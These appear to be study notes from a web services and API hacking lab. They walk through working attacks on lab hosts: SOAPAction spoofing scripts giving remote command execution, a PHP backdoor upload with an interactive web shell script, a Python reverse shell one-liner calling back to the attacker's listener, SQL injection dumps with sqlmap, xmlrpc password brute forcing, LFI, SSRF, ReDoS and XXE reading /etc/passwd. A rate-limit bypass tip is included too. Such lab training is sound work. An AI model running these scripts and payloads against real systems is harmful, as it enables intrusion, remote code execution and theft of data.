## Web Services Description Language (WSDL)
### Scenario: SOAP service residing at `http://<TARGET IP>:3002`
#### Perform directory fuzzing against the web service
```Shell
dirb http://<TARGET IP>:3002
```
It looks like `http://<TARGET IP>:3002/wsdl` exists.
#### Inspect using cURL
```Shell
curl http://<TARGET IP>:3002/wsdl 
```
Empty response
#### Fuzz parameters
```Shell
ffuf -w "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
```
There is a `wsdl` parameter
#### cURL the parameter
```Shell
curl -s -i http://10.129.202.133:3002/wsdl?wsdl
```
We identified the SOAP service's WSDL file

******Note: WSDL files can be found in many forms, such as /example.wsdl, ?wsdl, /example.disco, ?disco etc. DISCO is a Microsoft technology for publishing and discovering Web Services.

## SOAPAction Spoofing
#### Read the SOAP web service's WSDL file
```Shell
curl http://<TARGET IP>:3002/wsdl?wsdl
```
#### Pertinent information to pay attention to from the WSDL file:
```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```
Parameters of this `ExecuteCommand`:
```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```
There is a `cmd` parameter
#### Build a python script to issue requests to the SOAP service
```Python
#!/usr/bin/python

import requests

payload = '<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
#### Run the python script
```Shell
./client.py
```
We get an error mentioning This function is only allowed in internal networks. We have no access to the internal networks
#### Build a Python Script for doing a SOAPAction spoofing attack
```Python
#!/usr/bin/python

import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
- We specify LoginRequest in `<soap:Body>`, so that our request goes through. This operation is allowed from the outside.
- We specify the parameters of `ExecuteCommand` because we want to have the SOAP service execute a `whoami` command.
- We specify the blocked operation (`ExecuteCommand`) in the SOAPAction header
#### Run the Python script
```Shell
./client_soapaction_spoofing.py)
```
Output:
```
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>'
```

`<result>root\n</result>` == A successful script
#### Automated script (RCE)
```Python
#!/usr/bin/python

import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
#### Running the automated script
```Shell
./automate.py
```
## Command Injection

#### Execute TCP Dump
```Shell
tcpdump -i tun0 icmp
```
#### Execute the following URL
```
http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3
```
#### Execute a command that will list files and folders
```Shell
curl -i -s http://10.129.202.133:3003/ping-server.php/system/ls
```
## Attacking WordPress `xmlrpc.php`
#### Password Brute Forcing Attack against `xmlrpc.php`
```Shell
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
We will receive a `403 faultCode` error if the credentials are not valid.
#### Identifying correct method to call by going through the WordPress code and interacting with `xmlrpc.php`
```
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
In the example, the method of interest was `pingback.ping`, which allows for XML-RPC pingbacks
#### Attacks associated with pingbacks
- IP Disclosure: An attacker can call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
- Cross-Site Port Attack (XSPA): An attacker can call the `pingback.ping` method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
- DDoS: An attacker can call the `pingback.ping` method on numerous WordPress instances against a single target.

*`xmlrpc.php` must be enabled and the `pingback.ping` method must be available*
## Information Disclosure (w/ a twist of SQLi)
When assessing a web service or API for information disclosure, we should spend considerable time on fuzzing.
#### Parameter fuzzing with the `burp-parameter-names.txt` wordlist from SecLists
```Shell
ffuf -w "/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt" -u "http://$IP:3003/?FUZZ=test_value"
```
#### Parameter fuzz to exclude response sizes that are irrelevant (in this example, `19`)
```Shell
ffuf -w "/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt" -u "http://$IP:3003/?FUZZ=test_value" -v -fs 19
```
#### cURL the parameter
```Shell
curl http://$IP:3003/?id=1
```
#### Python script to brute force the API IDs
```Python
# Import two modules: requests and sys. request allows you to make HTTP requests and sys allows us to parse system arguments
import requests, sys

# define a function called "brute"
def brute():
	try:
		# Define a variable called "range", that goes up to 1000
		value = range(1000)
		# Try every number in the value variable
		for val in value:
			# Define the url variable as what is inputed after `brute_api.py`
			url = sys.argv[1]
			# Define what will be included with each call to the URL - the parameters
			r = requests.get(url + '/?id='+str(val))
			# Test each request to see if `position` is in the response. If it is, print that the number was found and what the number is, as well as the full URI
			if "position" in r.text: 
				print("Number found!", val)
				print(r.text)
	# If the script is called incorrectly, show an error
	except IndexError:
		print("Enter a URL e.g.,: http://$IP:3003")

brute()
```

***TIP: If there is a rate limit in place, you can always try to bypass it through headers such as `X-Forwarded-For`, `X-Forwarded-IP`, etc., or use proxies. These headers have to be compared with an IP most of the time. A possible bypass to whitelist filters could be setting the X-Forwarded-For header and the value to one of the IPs from the array. ***

### Lab Question 2:
#### SQLi detection payload
```
/?id=736373+UNION+SELECT+1,2,3--+-
```
![[SQLi inject payload 1.png]]
#### Enumerate database name, user, and database version
```
/?id=736373+UNION+SELECT+database(),user(),@@version--+-
```
![[database user version inject.png]]
#### Used SQLMap to enumerate database info
```Shell
sqlmap -u http://10.129.202.133:3003/?id=1 --dbs
```
#### Used SQLMap to enumerate tables in `htb` database
```Shell
sqlmap -u http://10.129.202.133:3003/?id=1 -D htb --tables
```
#### Used SQLMap to dump information from `users` table in `htb` database
```Shell
sqlmap -u http://10.129.202.133:3003/?id=1 -D htb -T users --dump
```
Output:
```
Database: htb
Table: users
[4 entries]
+---------+--------------------------------+------------+
| id      | username                       | position   |
+---------+--------------------------------+------------+
| 1       | admin                          | 1          |
| 2       | HTB-User-John                  | 2          |
| 3       | WebServices                    | 3          |
| 8374932 | HTB{THE_FL4G_FOR_SQLI_IS_H3RE} | 736373     |
+---------+--------------------------------+------------+
```

## Arbitrary File Upload
### PHP File Upload via API to RCE
#### Navigate to upload form page
![[rce upload form.png]]
#### Create backdoor.php file and upload
![[backdoorphp 1.png]]
The above allows us to append the parameter cmd to our request (to backdoor.php), which will be executed using `shell_exec()`. This is if we can determine `backdoor.php`'s location, if `backdoor.php` will be rendered successfully and if no PHP function restrictions exist.
![[uploaded.png]]
![[inspector output.png]]
- `backdoor.php` was successfully uploaded via a POST request to `/api/upload/`. An API seems to be handling the file uploading functionality of the application.
- The content type has been automatically set to `application/x-php`, which means there is no protection in place. The content type would probably be set to `application/octet-stream` or `text/plain` if there was one.
- Uploading a file with a .php extension is also allowed. If there was a limitation on the extensions, we could try extensions such as `.jpg.php`,` .PHP`, etc.
- Using something like `file_get_contents()` to identify php code being uploaded seems not in place either.
- We also receive the location where our file is stored,` http://<TARGET IP>:3001/uploads/backdoor.php`.
#### Python script to obtain a shell, leveraging the `backdoor.php` file
```Python
#!/usr/bin/python3

# Import argparse (for system arguments), time (for time), and requests (for HTTP/HTTPS requests), and os (used for operating system commands)
import argparse, time, requests, os

# Define the parser variable that used argparse to provide a description of this script
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs")

# Specify arguments for target, payload, and options, as well as help commands
parser.add_argument("-t", "--target", help="Specify the target host (e.g., http://<TARGET IP>:3001/uploads/backdoor.php)", required=True)
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload (e.g., a python3 reverse shell. IP and Port are required in the payload)")
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t ")

# Define variable for arguments as a variable holding the values of the above arguments so we can do args.option for example
args = parser.parse_args()

# Instruct the script to see if the target option and payload option are included in the arguments and to print the help menu if both are not included
if args.target == None and args.payload == None:
	parser.print_help()
	
# Instruct script to send requests with the GET method if the target and payload parameters are defined by the user and to return the output via text
elif args.target and args.payload:
	print(requests.get(args.target + '/?cmd='+args.payload).text)

# Make an option for an interactive shell if the --option command is set to yes
if args.target and args.option == "yes":
	os.system("clear")

	# start a while loop that will keep the shell interactive until CTRL+C is inputted
	while True:
		# print output of whatever is inputted into the interactive shell via the cmd= parameter
		try:
			cmd = input("$ ")
			print(requests.get(args.target + "/?cmd=" + cmd).text)
			# Have a wait time of .3 seconds during each request
			time.sleep(0.3)
		# Make exceptions for the errors of an invalid URL scheme or connection issue
		except requests.exceptions.InvalidSchema:
			print("Invalid URL Schema: Use http:// or https://")
		except requests.exceptions.ConnectionError:
			print("Connection to requested URL failed")
			
```
#### Run the script as follows
```Shell
python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
```
#### To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above
```Shell
python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes

$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
Ensure that an active listener (such as Netcat) is in place before executing
## Local File Inclusion (LFI)
#### Begin interaction with the target
```Shell
curl http://10.129.226.209:3000/api
```
Output:
```
{"status":"UP"}
```
#### Fuzz the API's endpoints using `common-api-endpoints-mazen160.txt`
```Shell
ffuf -w "/usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u "http://10.129.226.209:3000/api/FUZZ"
```
Output:
```
download                [Status: 200, Size: 71, Words: 5, Lines: 1, Duration: 29ms]
```
#### Examine the `download` directory
```Shell
curl http://10.129.226.209:3000/api/download
```
Output:
```
{"success":false,"error":"Input the filename via /download/<filename>"}
```
#### Attempt LFI input
```Shell
curl "http://10.129.226.209:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```

## XSS
#### Look at API from previous section at `http://<TARGET IP>:3000/api/download`
![[xss api.png]]
`test_value` is reflected in the response
#### Try entering JavaScript code into the URL instead of `test_value`
```javascript
<script>alert(document.domain)</script>
```
![[xss payload 1.png]]
It appears it's URL encoding it
#### URL encode the payload
```JavaScript
%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```
![[xss payload 2.png]]
## Server-Side Request Forgery (SSRF)
#### Go to `http://<TARGET IP>:3000/api/userinfo`
#### Interact w/ API using cURL
```Shell
curl http://10.129.202.133:3000/api/userinfo
```
Output:
```
{"success":false,"error":"'id' parameter is not given."}
```
#### Start a netcat listener
```Shell
nc -lnvp 4444
```
#### Use `id` parameter to try and GET request your own IP
```Shell
curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
```
#### If unsuccessful, try base64 encoding
```Shell
echo "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
```

```Shell
curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```
## Regular Expression Denial of Service (ReDoS)
#### Interact with the target
```Shell
curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
```

Submit the above regex to https://regex101.com for an in-depth explanation. Then, submit the above regex to https://jex.im/regulex/ for a visualization.
![[regex dos.png]]
The second and third groups are doing bad iterative checks.
#### Submit the following value and see how long it takes the API to respond
```Shell
curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
```
You will notice that the API takes several seconds to respond and that longer payloads increase the evaluation time.
## XML External Entity (XXE) Injection
#### Try authenticating over Burp Suite to `http://<target ip>:3001` and intercept the request
![[xxe inject intercept.png]]
- We notice that an API is handling the user authentication functionality of the application.
- User authentication is generating XML data.
### Crafting an exploit to read internal files, such as `/etc/passwd` on the server
#### Append a DOCTYPE to the request
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>
```
We defined a DTD called pwn, and inside of that, we have an `ENTITY`. We may also define custom entities (i.e., XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data. This can be done using the ENTITY keyword, followed by the `ENTITY` name and its value.

We have called our external entity somename, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal files.
#### Start a netcat listener
```Shell
nc -lnvp 4444
```
#### Make an API call w/ the crafted payload
```Shell
curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
```
***This won't work. Need to define external entity***
#### Recraft payload with the defined external entity
```Shell
curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```
#### Look at netcat connection being made to API. This will indicate an XXE injection vulnerability
#### To read internal files
```Shell
curl -X POST http://10.129.202.133:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "file:////etc/passwd"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```